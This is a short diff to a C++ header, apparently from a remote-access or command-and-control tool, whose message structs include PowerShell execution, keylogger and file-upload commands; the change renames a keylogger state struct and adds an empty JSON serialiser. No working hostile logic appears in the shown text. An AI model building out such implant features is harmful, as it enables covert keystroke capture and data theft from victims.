@@ -1,6 +1,7 @@
 //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^{ BEGINNING OF FILE }^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
 #pragma once
 #include <string>
+#include <cstdint>
 #include <rapidjson/document.h>
 #include <rapidjson/stringbuffer.h>
 #include <rapidjson/writer.h>
@@ -27,10 +28,13 @@ struct CommandPowershell
     }
 };
 
-struct KeyloggerState
+struct CommandKeylogger
 {
-    bool isRunning;
-    std::string data;
+    rapidjson::Value ToJsonValue(rapidjson::Document::AllocatorType &allocator) const
+    {
+        rapidjson::Value value(rapidjson::kObjectType);
+        return value;
+    }
 };
 
 struct CommandUploadFile
